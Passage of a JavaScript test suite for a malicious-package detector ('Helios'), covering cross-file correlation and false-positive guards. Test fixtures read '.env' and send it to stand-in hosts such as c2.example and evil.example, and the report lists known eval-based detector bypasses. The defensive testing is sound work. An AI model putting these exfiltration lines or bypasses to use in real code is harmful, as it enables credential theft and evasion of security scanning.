  const src = pad(`const b = process.binding('spawn_sync'); eval('void 0'); module.exports = b;`);
  const result = detector.scanModuleSync('proc-binding.js', src, 'proc-binding.js');
  assert.ok(result.detections.some(d => d.rule === 'DYNAMIC_CODE_EXEC_CHAIN'), `Expected DYNAMIC_CODE_EXEC_CHAIN: ${JSON.stringify(result.detections)}`);
});

// F-41c. FP guard: dns.resolve without a credential read must NOT block (common in net libs).
test('dns.resolve without a credential read is not blocked (F-41 FP)', () => {
  const src = pad(`const dns = require('dns'); module.exports = (h, cb) => dns.resolve(h, cb);`);
  const result = detector.scanModuleSync('dns-lib.js', src, 'dns-lib.js');
  assert.ok(!result.detections.some(d => !d.warnOnly), `bare dns.resolve must not block: ${JSON.stringify(result.detections)}`);
});

// ─────────────────────────────────────────────────────────────────────────────
// Cross-file correlation guards (ported from the registry, package-scoped for runtime).
// A malicious package can split a read (file A) from the exfil (file B) to dodge per-file
// rules. Scoping to one npm package is what keeps this from false-positing across the app.
// Cross-file is OPT-IN (soak showed it FPs on large legit packages); enable it for these tests.
// ─────────────────────────────────────────────────────────────────────────────
process.env.FW_ENABLE_CROSSFILE = '1';

// F-42a. TP: same package — .env read in a.js + egress in b.js → CROSS_FILE block on b.js.
test('Cross-file split (.env read + egress) in one package is blocked (F-42 TP)', () => {
  detector.scanModuleSync('a.js', "const s = require('fs').readFileSync('.env','utf8');", '/n/node_modules/evil/a.js', 'evil');
  const r = detector.scanModuleSync('b.js', "require('https').get('http://c2.example/?d='+s);", '/n/node_modules/evil/b.js', 'evil');
  assert.ok(r.detections.some(d => d.rule === 'CREDENTIAL_EXFILTRATION_CROSS_FILE'), `Expected CROSS_FILE: ${JSON.stringify(r.detections)}`);
});

// F-42b. TP: same package — dynamic code in a.js + process exec in b.js → CROSS_FILE block.
test('Cross-file split (eval + child_process) in one package is blocked (F-42 TP)', () => {
  detector.scanModuleSync('a.js', "eval(payload);", '/n/node_modules/evil/a.js', 'evil');
  const r = detector.scanModuleSync('b.js', "require('child_process').exec(cmd);", '/n/node_modules/evil/b.js', 'evil');
  assert.ok(r.detections.some(d => d.rule === 'DYNAMIC_CODE_EXEC_CHAIN_CROSS_FILE'), `Expected CROSS_FILE exec: ${JSON.stringify(r.detections)}`);
});

// F-42c. FP: a package that reads a non-sensitive asset (bare fs.readFile) in one file and makes
// an HTTP call in another must NOT block — the cred rule keys on a genuine credential PATH, not
// any file read (the tightening carried back to the registry on sync).
test('Cross-file bare fs.readFile + egress (no credential path) is not blocked (F-42 FP)', () => {
  detector.scanModuleSync('a.js', "const t = require('fs').readFileSync('./template.html','utf8');", '/n/node_modules/lib/a.js', 'lib');
  const r = detector.scanModuleSync('b.js', "require('https').get('http://api.example/x');", '/n/node_modules/lib/b.js', 'lib');
  assert.ok(!r.detections.some(d => !d.warnOnly), `bare readFile + egress must not block: ${JSON.stringify(r.detections.filter(d => !d.warnOnly))}`);
});

// F-42d. FP: credential read in package A and egress in package B (different packages) must NOT
// pair — scoping bounds correlation to a single package.
test('Cross-file across two different packages does not pair (F-42 FP)', () => {
  detector.scanModuleSync('a.js', "const s = require('fs').readFileSync('.env','utf8');", '/n/node_modules/pkgA/a.js', 'pkgA');
  const r = detector.scanModuleSync('b.js', "require('https').get('http://api.example/x');", '/n/node_modules/pkgB/b.js', 'pkgB');
  assert.ok(!r.detections.some(d => !d.warnOnly), `distinct packages must not pair: ${JSON.stringify(r.detections.filter(d => !d.warnOnly))}`);
});

// F-42e. FP: first-party app code (no packageKey) is not subject to cross-file correlation —
// the developer's own files reading config and making network calls is normal.
test('Cross-file for first-party app code (no packageKey) is skipped (F-42 FP)', () => {
  detector.scanModuleSync('config.js', "const s = require('fs').readFileSync('.env','utf8');", '/app/src/config.js', null);
  const r = detector.scanModuleSync('api.js', "require('https').get('http://api.example/x');", '/app/src/api.js', null);
  assert.ok(!r.detections.some(d => !d.warnOnly), `first-party must not pair: ${JSON.stringify(r.detections.filter(d => !d.warnOnly))}`);
});

// F-42f. Registry batch path: finalizePackage() (no packageKey, whole map) catches the same
// split and returns a CROSS_FILE violation with the two files.
test('Registry batch finalizePackage() catches a cross-file split (F-42 batch)', () => {
  detector.scanModuleSync('a.js', "const s = fs.readFileSync('.env');", 'a.js');
  detector.scanModuleSync('b.js', "https.get('http://evil.example/c?d=' + s);", 'b.js');
  const viol = detector.finalizePackage();
  assert.strictEqual(viol.length, 1, `Expected 1 cross-file violation: ${JSON.stringify(viol)}`);
  assert.strictEqual(viol[0].severity, 'CRITICAL');
  assert.ok(Array.isArray(viol[0].files) && viol[0].files.length === 2, 'violation should name the two files');
});

// F-42g. Cross-file is OFF by default — the runtime scoped path does not fire without the flag.
test('Cross-file is opt-in: default-off runtime does not block a split (F-42 default-off)', () => {
  delete process.env.FW_ENABLE_CROSSFILE;
  detector.scanModuleSync('a.js', "const s = require('fs').readFileSync('.env','utf8');", '/n/node_modules/evil/a.js', 'evil');
  const r = detector.scanModuleSync('b.js', "require('https').get('http://c2.example/?d='+s);", '/n/node_modules/evil/b.js', 'evil');
  assert.ok(!r.detections.some(d => d.rule && d.rule.endsWith('_CROSS_FILE')), `default-off must not run cross-file: ${JSON.stringify(r.detections)}`);
  process.env.FW_ENABLE_CROSSFILE = '1'; // restore for any later additions
});

// ─── report ──────────────────────────────────────────────────────────────────

console.log('\n═══════════════════════════════════════════════════════════════');
console.log('  Helios Adversarial Test Suite');
console.log('═══════════════════════════════════════════════════════════════\n');

for (const r of results) {
  const icon = r.status === 'PASS' ? '✅' : '❌';
  console.log(`${icon} ${r.name}`);
  if (r.error) console.log(`   Error: ${r.error}`);
}

const passed = results.filter(r => r.status === 'PASS').length;
const failed = results.filter(r => r.status === 'FAIL').length;

console.log(`\n─────────────────────────────────────────────────────────────`);
console.log(`Results: ${passed} passed, ${failed} failed out of ${results.length} tests`);
console.log(`─────────────────────────────────────────────────────────────\n`);

console.log('Known bypasses (documented for future work):');
console.log('  1. Bracket-notation eval:   this["ev"+"al"]  → needs AST or V8 Inspector');
console.log('  2. String concatenation:    global["ev"+"al"] → needs taint tracking');
console.log('  3. Variable-alias eval:     const fn = eval; fn("code") → needs runtime Proxy');
console.log('  4. Prototype chain access:  Object.getPrototypeOf(eval).constructor → needs runtime instrumentation');
console.log('\nNote: Array join reassembly (["ch","ild"].join("")) bypasses per-module isolation; may be caught by cross-module state in practice.');
console.log('\nAll bypasses require runtime (dynamic) analysis. Static analysis has fundamental limits.');
console.log('Behavioral detection mitigates bypasses by flagging dangerous ACTION SEQUENCES');
console.log('rather than specific strings, providing defense-in-depth.\n');

if (failed > 0) {
  process.exit(1);
}
